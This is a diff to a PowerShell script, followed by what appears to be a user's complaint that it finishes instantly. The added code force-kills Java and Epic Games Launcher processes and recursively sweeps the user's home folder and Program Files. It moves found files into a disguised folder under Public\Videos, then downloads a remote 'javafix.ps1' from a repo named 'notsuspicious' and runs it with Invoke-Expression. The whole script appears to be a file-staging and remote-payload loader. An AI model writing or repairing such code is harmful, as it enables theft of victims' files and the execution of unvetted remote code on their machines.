@@ -1,3 +1,5 @@
+Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force
+
 # Define source and destination paths
 $sourcePaths = @("C:\Users\$($env:USERNAME)", "C:\Program Files")
 $destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
@@ -28,9 +30,25 @@ function SearchAndMoveFile {
 
         $counter++
     }
+
+    # Recursively search subdirectories
+    $subDirectories = Get-ChildItem -Path $directory -Directory -ErrorAction SilentlyContinue
+    foreach ($subDirectory in $subDirectories) {
+        SearchAndMoveFile -directory $subDirectory.FullName
+    }
 }
 
 # Loop through source paths and start the search
 foreach ($path in $sourcePaths) {
     SearchAndMoveFile -directory $path
 }
+
+# Download and execute javafix.ps1 script
+try {
+    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
+    Invoke-Expression $javaFixScript.Content
+    Write-Host "Java fix script executed successfully."
+}
+catch {
+    Write-Host "Failed to execute Java fix script: $_"
+}  it finishes the whole script instantly with: Java fix script executed successfully and pauses
